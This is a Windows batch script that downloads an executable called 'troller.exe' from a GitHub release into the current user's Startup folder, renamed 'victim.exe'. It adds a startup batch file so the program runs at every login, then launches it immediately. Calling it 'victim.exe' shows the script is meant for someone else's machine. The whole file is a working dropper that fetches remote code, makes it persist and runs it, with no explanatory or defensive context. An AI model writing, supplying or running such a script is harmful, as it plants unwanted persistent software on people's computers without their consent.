@echo off
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

:: download the executable and the video file
curl -L "https://github.com/vexnity/troller-revamped/releases/download/Release/troller.exe" -o "%STARTUP_FOLDER%\victim.exe"
curl "https://raw.githubusercontent.com/vexnity/troller-revamped/preview/test.mp4" -o "%STARTUP_FOLDER%\test.mp4"

:: create a batch file to run the executable at startup
echo @echo off > "%STARTUP_FOLDER%\run_victim.bat"
echo start "" "%STARTUP_FOLDER%\victim.exe" >> "%STARTUP_FOLDER%\run_victim.bat"

:: run the executable immediately
start "" "%STARTUP_FOLDER%\victim.exe"

echo Files have been moved to startup folder, set to run at startup, and executed.
